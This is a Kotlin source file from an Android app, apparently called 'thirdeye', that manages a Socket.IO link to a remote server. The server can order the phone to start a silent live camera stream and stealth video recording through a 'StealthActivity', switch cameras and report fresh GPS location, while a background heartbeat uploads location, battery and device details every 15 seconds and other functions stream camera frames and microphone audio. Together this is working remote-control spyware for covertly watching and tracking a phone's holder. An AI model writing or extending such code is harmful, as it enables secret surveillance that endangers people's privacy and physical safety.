package com.thirdeye.app.uploader

import android.content.Context
import android.util.Base64
import android.util.Log
import com.thirdeye.app.service.CameraRecordingService
import com.thirdeye.app.service.LiveStreamService
import com.thirdeye.app.utils.AppPreferences
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.net.URI

object SocketManager {
    private const val TAG = "SocketManager"

    private var socket: Socket? = null
    @Volatile
    private var isConnecting = false
    private var currentServerUrl: String? = null
    private var heartbeatThread: Thread? = null
    private var lastLiveStreamCmdTime = 0L
    private var lastRecordCmdTime = 0L

    fun isConnected(): Boolean {
        return socket?.connected() == true
    }

    fun initAndConnect(context: Context) {
        val prefs = AppPreferences(context)
        val serverUrl = prefs.serverUrl.trimEnd('/')

        val s = socket
        if (s != null && currentServerUrl == serverUrl) {
            if (s.connected()) {
                registerDevice(context)
                startHeartbeat(context)
                return
            } else {
                try {
                    s.connect()
                    return
                } catch (e: Exception) {
                    Log.w(TAG, "Socket reconnect attempt error: ${e.message}")
                }
            }
        }

        try {
            isConnecting = true
            currentServerUrl = serverUrl

            // Clean up existing socket if changing servers
            socket?.let {
                try {
                    it.disconnect()
                    it.off()
                } catch (e: Exception) {
                    // Ignore
                }
            }

            val options = IO.Options().apply {
                reconnection = true
                reconnectionAttempts = Int.MAX_VALUE
                reconnectionDelay = 1000
                reconnectionDelayMax = 5000
                timeout = 15000
                transports = arrayOf("websocket", "polling")
            }

            socket = IO.socket(URI.create(serverUrl), options)

            val onConnectedAction = {
                isConnecting = false
                Log.i(TAG, " Connected to central backend socket at $serverUrl!")
                registerDevice(context)
                startHeartbeat(context)
            }

            socket?.on(Socket.EVENT_CONNECT) {
                onConnectedAction()
            }

            socket?.on("reconnect") {
                onConnectedAction()
            }

            socket?.on(Socket.EVENT_DISCONNECT) {
                isConnecting = false
                Log.w(TAG, " Disconnected from backend socket")
            }

            socket?.on(Socket.EVENT_CONNECT_ERROR) { args ->
                isConnecting = false
                Log.w(TAG, "Socket connection error: ${args.firstOrNull()}")
            }

            // Command 1: Start silent live camera stream
            socket?.on("start-live-stream") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject
                    val targetDeviceId = data?.optString("deviceId")
                    val myDeviceId = BackendClient.getDeviceId(context)
                    if (!targetDeviceId.isNullOrEmpty() && targetDeviceId != myDeviceId) {
                        return@on
                    }
                    val now = System.currentTimeMillis()
                    if (now - lastLiveStreamCmdTime < 1000L) {
                        Log.d(TAG, "Ignoring duplicate start-live-stream within 1s")
                        return@on
                    }
                    lastLiveStreamCmdTime = now

                    val camera = data?.optString("camera", "BACK") ?: "BACK"
                    Log.i(TAG, " Received START live stream command (Lens: $camera)")

                    val wasRecordingRunning = CameraRecordingService.isServiceRunning
                    if (wasRecordingRunning) {
                        Log.i(TAG, "🎥 CameraRecordingService was running. Gracefully stopping recording to switch to live stream.")
                        CameraRecordingService.stopService(context, enableVibration = false)
                    }

                    Thread {
                        try {
                            if (wasRecordingRunning) {
                                Thread.sleep(350)
                            }
                        } catch (e: Exception) {
                            // ignore
                        }
                        com.thirdeye.app.service.StealthActivity.launchForLiveStream(context, camera)
                    }.start()
                } catch (e: Exception) {
                    Log.e(TAG, "Error handling start-live-stream", e)
                }
            }

            // Command 2: Stop live stream
            socket?.on("stop-live-stream") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject
                    val targetDeviceId = data?.optString("deviceId")
                    val myDeviceId = BackendClient.getDeviceId(context)
                    if (!targetDeviceId.isNullOrEmpty() && targetDeviceId != myDeviceId) {
                        return@on
                    }
                    Log.i(TAG, " Received STOP live stream command")
                    LiveStreamService.stopService(context)
                } catch (e: Exception) {
                    Log.e(TAG, "Error handling stop-live-stream", e)
                }
            }

            // Command 3: Switch camera (FRONT <-> BACK)
            socket?.on("switch-camera") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject
                    val targetDeviceId = data?.optString("deviceId")
                    val myDeviceId = BackendClient.getDeviceId(context)
                    if (!targetDeviceId.isNullOrEmpty() && targetDeviceId != myDeviceId) {
                        return@on
                    }
                    val camera = data?.optString("camera", "BACK") ?: "BACK"
                    Log.i(TAG, " Received SWITCH camera command: $camera")
                    LiveStreamService.switchCamera(context, camera)
                } catch (e: Exception) {
                    Log.e(TAG, "Error handling switch-camera", e)
                }
            }

            // Command 4: Remote start stealth video recording
            socket?.on("start-remote-recording") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject
                    val targetDeviceId = data?.optString("deviceId")
                    val myDeviceId = BackendClient.getDeviceId(context)
                    if (!targetDeviceId.isNullOrEmpty() && targetDeviceId != myDeviceId) {
                        return@on
                    }
                    val now = System.currentTimeMillis()
                    if (now - lastRecordCmdTime < 1000L) {
                        Log.d(TAG, "Ignoring duplicate start-remote-recording within 1s")
                        return@on
                    }
                    lastRecordCmdTime = now

                    val camera = data?.optString("camera", "BACK") ?: "BACK"
                    val lens = if (camera.equals("FRONT", ignoreCase = true)) "FRONT" else "BACK"
                    // Do NOT overwrite user's saved phone settings (prefs.cameraLens)!
                    // Use lens only as session override for this recording:
                    Log.i(TAG, "📡 Received REMOTE START recording command with session lens: $lens (#1 Top Priority)")

                    // Stop LiveStreamService first to cleanly release camera & mic hardware
                    val wasLiveRunning = LiveStreamService.isServiceRunning
                    if (wasLiveRunning) {
                        LiveStreamService.stopService(context)
                    }

                    Thread {
                        try {
                            if (wasLiveRunning) {
                                Thread.sleep(350)
                            }
                        } catch (e: Exception) {
                            // ignore
                        }
                        com.thirdeye.app.service.StealthActivity.launchForRemoteRecording(context, lens)
                    }.start()
                } catch (e: Exception) {
                    Log.e(TAG, "Error starting remote recording", e)
                }
            }

            // Command 5: Remote stop stealth video recording
            socket?.on("stop-remote-recording") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject
                    val targetDeviceId = data?.optString("deviceId")
                    val myDeviceId = BackendClient.getDeviceId(context)
                    if (!targetDeviceId.isNullOrEmpty() && targetDeviceId != myDeviceId) {
                        return@on
                    }
                    Log.i(TAG, " Received REMOTE STOP recording command")
                    CameraRecordingService.stopService(context, enableVibration = false)
                } catch (e: Exception) {
                    Log.e(TAG, "Error stopping remote recording", e)
                }
            }

            // Command 6: Remote Request Live GPS Location Refresh
            socket?.on("request-device-location") { args ->
                try {
                    val data = args.firstOrNull() as? JSONObject
                    val targetDeviceId = data?.optString("deviceId")
                    val myDeviceId = BackendClient.getDeviceId(context)
                    if (!targetDeviceId.isNullOrEmpty() && targetDeviceId != myDeviceId) {
                        return@on
                    }
                    Log.i(TAG, "📍 Received Remote GPS Refresh Request for: $myDeviceId")
                    com.thirdeye.app.utils.LocationTracker.forceRefreshLocation(context) { freshLoc ->
                        val payload = JSONObject().apply {
                            put("deviceId", myDeviceId)
                            put("deviceName", BackendClient.getDeviceName())
                            put("batteryLevel", BackendClient.getBatteryLevel(context))
                            put("isRecording", prefs.isRecording)
                            put("timestamp", System.currentTimeMillis())
                            put("latitude", freshLoc.latitude)
                            put("longitude", freshLoc.longitude)
                            put("locationName", freshLoc.fullAddress)
                            put("villageOrPara", freshLoc.villageOrPara)
                            put("districtAndCountry", freshLoc.districtAndCountry)
                            put("accuracy", freshLoc.accuracy)
                            put("source", "GPS")
                        }
                        socket?.emit("device-heartbeat", payload)
                        Log.i(TAG, "📍 Emitted fresh GPS response: ${freshLoc.villageOrPara} (${freshLoc.latitude}, ${freshLoc.longitude})")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error handling request-device-location", e)
                }
            }

            socket?.connect()
            startHeartbeat(context)
        } catch (e: Exception) {
            isConnecting = false
            Log.e(TAG, "Socket init error", e)
        }
    }

    /**
     * Force immediate reconnect upon network availability change
     */
    fun reconnect(context: Context) {
        try {
            val s = socket
            if (s != null && s.connected()) {
                registerDevice(context)
            } else if (s != null) {
                s.connect()
            } else {
                initAndConnect(context)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Reconnect error", e)
            initAndConnect(context)
        }
    }

    private fun startHeartbeat(context: Context) {
        if (heartbeatThread != null && heartbeatThread?.isAlive == true) {
            return
        }
        heartbeatThread = Thread {
            try {
                val prefs = AppPreferences(context)
                while (!Thread.currentThread().isInterrupted) {
                    try {
                        val s = socket
                        if (s != null && s.connected()) {
                            val battery = BackendClient.getBatteryLevel(context)
                            val loc = BackendClient.getLocation(context)

                            val payload = JSONObject().apply {
                                put("deviceId", BackendClient.getDeviceId(context))
                                put("deviceName", BackendClient.getDeviceName())
                                put("batteryLevel", battery)
                                put("isRecording", CameraRecordingService.isServiceRunning || prefs.isRecording)
                                put("videoQuality", prefs.videoQuality)
                                put("cameraLens", prefs.cameraLens)
                                put("timestamp", System.currentTimeMillis())
                                if (loc != null) {
                                    put("latitude", loc.latitude)
                                    put("longitude", loc.longitude)
                                    put("locationName", loc.address)
                                    put("villageOrPara", loc.villageOrPara)
                                    put("districtAndCountry", loc.districtAndCountry)
                                }
                            }
                            s.emit("device-heartbeat", payload)
                        } else {
                            socket?.connect()
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "Heartbeat cycle error: ${e.message}")
                    }
                    Thread.sleep(15000)
                }
            } catch (e: InterruptedException) {
                // Thread interrupted
            }
        }.apply {
            isDaemon = true
            name = "SocketHeartbeatThread"
            start()
        }
    }

    /**
     * Notify central server immediately when recording starts or stops
     */
    fun emitRecordingStatus(context: Context, isRecording: Boolean) {
        try {
            if (socket?.connected() == true) {
                val deviceId = BackendClient.getDeviceId(context)
                val payload = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("isRecording", isRecording)
                }
                socket?.emit("device-recording-status", payload)
                Log.i(TAG, "📡 Emitted device-recording-status: $isRecording for $deviceId")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error emitting recording status", e)
        }
    }

    fun registerDevice(context: Context) {
        if (socket?.connected() != true) return

        try {
            val deviceId = BackendClient.getDeviceId(context)
            val deviceName = BackendClient.getDeviceName()
            val battery = BackendClient.getBatteryLevel(context)
            val loc = BackendClient.getLocation(context)
            val prefs = AppPreferences(context)

            val payload = JSONObject().apply {
                put("deviceId", deviceId)
                put("deviceName", deviceName)
                put("batteryLevel", battery)
                put("videoQuality", prefs.videoQuality)
                put("cameraLens", prefs.cameraLens)
                if (loc != null) {
                    put("latitude", loc.latitude)
                    put("longitude", loc.longitude)
                    put("locationName", loc.address)
                    put("villageOrPara", loc.villageOrPara)
                    put("districtAndCountry", loc.districtAndCountry)
                }
            }

            socket?.emit("register-device", payload)
            Log.d(TAG, "Device registered on socket: $deviceId ($deviceName)")
        } catch (e: Exception) {
            Log.e(TAG, "Failed registering device", e)
        }
    }

    /**
     * Streams a compressed JPEG frame to backend over WebSocket
     */
    fun sendFrame(context: Context, jpegBytes: ByteArray) {
        if (socket?.connected() != true) return

        try {
            val base64Frame = Base64.encodeToString(jpegBytes, Base64.NO_WRAP)
            val payload = JSONObject().apply {
                put("deviceId", BackendClient.getDeviceId(context))
                put("frame", base64Frame)
            }
            socket?.emit("stream-frame", payload)
        } catch (e: Exception) {
            Log.w(TAG, "Failed sending frame: ${e.message}")
        }
    }

    /**
     * Streams raw PCM 16-bit 16kHz audio chunk to backend over WebSocket
     */
    fun sendAudio(context: Context, pcmBytes: ByteArray) {
        if (socket?.connected() != true) return

        try {
            val base64Audio = Base64.encodeToString(pcmBytes, Base64.NO_WRAP)
            val payload = JSONObject().apply {
                put("deviceId", BackendClient.getDeviceId(context))
                put("audio", base64Audio)
                put("sampleRate", 16000)
            }
            socket?.emit("stream-audio", payload)
        } catch (e: Exception) {
            Log.w(TAG, "Failed sending audio: ${e.message}")
        }
    }

    fun disconnect() {
        heartbeatThread?.interrupt()
        heartbeatThread = null
        socket?.disconnect()
        socket?.off()
        socket = null
        isConnecting = false
        currentServerUrl = null
    }
}
